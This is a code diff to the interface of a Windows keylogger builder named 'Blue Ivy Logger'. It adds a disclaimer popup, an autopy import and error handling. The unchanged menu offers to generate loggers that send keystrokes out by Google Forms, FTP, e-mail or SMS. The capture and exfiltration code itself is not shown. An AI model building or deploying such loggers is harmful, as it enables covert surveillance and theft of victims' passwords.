@@ -4,8 +4,9 @@
 from __future__ import print_function
 from colorama import init, AnsiToWin32
 from colorama import Fore, Back, Style
-import sys
 import os
+import sys
+import autopy
 
 init(wrap=False)
 stream = AnsiToWin32(sys.stderr).stream
@@ -310,11 +311,36 @@ pythoncom.PumpMessages()
         '''
         return output
 
+def disclaimer():
+    terms = autopy.alert.alert(msg="Disclaimer", title='''
+
+ --------------------------------------------------------------
+    __##                                          
+   /.__.\                                           
+   \ \/ /                      
+ __/  . \      
+ \-)   . )                  
+  \___._/                                                      
+ ___|_|____Blue Ivy Logger is a powerful keylogger for Windows 
+    " "    environments. You have a variety of options to      
+ generate your customized logger. Author takes no              
+ responsibility for any kind of damage you cause. This is     
+ developed for educational and research purposes only. Use     
+ this at your own risk. You should not use this to infect      
+ remote systems and perform any damage. \n\nClick Ok if you agree  
+\nClick Cancel if you don't agree.                     
+\n\nCopyright (C) 2014 Osanda Malith Jayathissa                  
+ --------------------------------------------------------------
+
+        ''', default_button="OK", cancel_button="candcel")
+    return terms
+
 def cls():
     if sys.platform == 'win32': os.system('cls')
     else: os.system('clear')
 
 def main():
+    cls()
     print (Style.BRIGHT, Fore.CYAN + '''
       _______   __       __  __   ______       ________  __   __   __  __   
     /_______/\\ /_/\\     /_/\\/_/\\ /_____/\\     /_______/\\/_/\\ /_/\\ /_/\\/_/\\  
@@ -349,8 +375,10 @@ def main():
     print (Style.BRIGHT, Fore.YELLOW + 'Follow: '+ Style.RESET_ALL, end='' ,file=stream)
     print (Style.DIM, Fore.WHITE +'@OsandaMalith'+ Style.RESET_ALL, file=stream)
     try:
-        cls()
-        choice = int(input('[-] What do you like to generate?\n1. A Local Keylogger\n2. Google Forms Logger\n3. FTP Logger\
+        terms = disclaimer()
+        if terms == False: sys.exit(0) 
+        else: pass
+        choice = int(input('\n[-] What do you like to generate?\n1. A Local Keylogger\n2. Google Forms Logger\n3. FTP Logger\
             \n4. E-Mail Logger\n5. SMS Logger \n6. Exit\n>>'))
         if choice == 6: exit(0)
         while 1:
@@ -384,6 +412,8 @@ def main():
     except EOFError:
         print ('[!] Ctrl + D detected\n[!] Exiting')
         sys.exit(0)
+    except Exception as e:
+        print (e)
 if __name__ == '__main__':
     main()
 #EOF
